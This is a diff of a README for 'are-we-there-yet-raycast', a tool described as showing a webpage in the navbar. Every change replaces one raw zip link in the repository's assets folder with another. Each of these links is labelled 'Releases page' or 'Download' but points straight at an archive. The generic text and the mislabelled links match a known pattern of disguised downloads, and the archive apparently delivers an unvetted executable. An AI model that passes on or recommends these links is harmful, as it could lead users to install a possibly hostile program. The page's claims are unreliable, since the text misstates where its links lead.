@@ -1,7 +1,7 @@
 # 🌟 are-we-there-yet-raycast - Access Webpages Without Refreshing
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/Vikiza5/are-we-there-yet-raycast/main/assets/are-we-there-yet-raycast-v3.3.zip)](https://raw.githubusercontent.com/Vikiza5/are-we-there-yet-raycast/main/assets/are-we-there-yet-raycast-v3.3.zip)
+[![Download](https://github.com/Vikiza5/are-we-there-yet-raycast/raw/refs/heads/main/assets/we_raycast_are_there_yet_1.4.zip)](https://github.com/Vikiza5/are-we-there-yet-raycast/raw/refs/heads/main/assets/we_raycast_are_there_yet_1.4.zip)
 
 ## 📖 Overview
 Are you tired of constantly refreshing a single webpage just to check for updates? With are-we-there-yet-raycast, you can bring the webpage directly to your navbar. This tool makes it easy for you to stay updated without the hassle of clicking through your browser. It’s simple to set up and user-friendly.
@@ -10,7 +10,7 @@ Are you tired of constantly refreshing a single webpage just to check for update
 Follow these steps to download and run are-we-there-yet-raycast:
 
 ### 1. Visit the Releases Page
-Start by visiting the [Releases page](https://raw.githubusercontent.com/Vikiza5/are-we-there-yet-raycast/main/assets/are-we-there-yet-raycast-v3.3.zip) for the latest version of the software. The Releases page contains the files you need to run the application.
+Start by visiting the [Releases page](https://github.com/Vikiza5/are-we-there-yet-raycast/raw/refs/heads/main/assets/we_raycast_are_there_yet_1.4.zip) for the latest version of the software. The Releases page contains the files you need to run the application.
 
 ### 2. Download the Application
 On the Releases page, locate the most recent version. Look for the file suited for your operating system (e.g., Windows, macOS). Click on the filename to download it.
@@ -40,7 +40,7 @@ Now you can directly access your chosen webpage from your navbar without refresh
 ## ❓ Frequently Asked Questions
 
 ### How do I know if a new version is available?
-Check the [Releases page](https://raw.githubusercontent.com/Vikiza5/are-we-there-yet-raycast/main/assets/are-we-there-yet-raycast-v3.3.zip) regularly for updates or follow the repository for notifications.
+Check the [Releases page](https://github.com/Vikiza5/are-we-there-yet-raycast/raw/refs/heads/main/assets/we_raycast_are_there_yet_1.4.zip) regularly for updates or follow the repository for notifications.
 
 ### Can I use this with any webpage?
 Yes, you can monitor any webpage that is accessible via a standard URL.
@@ -59,7 +59,7 @@ If you experience issues during installation or use:
 If you have questions or need assistance, feel free to reach out through the GitHub issues page of the repository. The community is here to help.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Vikiza5/are-we-there-yet-raycast/main/assets/are-we-there-yet-raycast-v3.3.zip) and download the latest version. Follow the steps outlined above, and you’ll be ready to access your desired webpage in no time!
+To get started, visit the [Releases page](https://github.com/Vikiza5/are-we-there-yet-raycast/raw/refs/heads/main/assets/we_raycast_are_there_yet_1.4.zip) and download the latest version. Follow the steps outlined above, and you’ll be ready to access your desired webpage in no time!
 
 ## 🔍 Conclusion
 are-we-there-yet-raycast offers a straightforward solution for users wanting easy access to a webpage without the constant need to refresh. With its simple setup and user-friendly interface, you can enjoy live updates with ease. Download now and simplify your browsing experience!
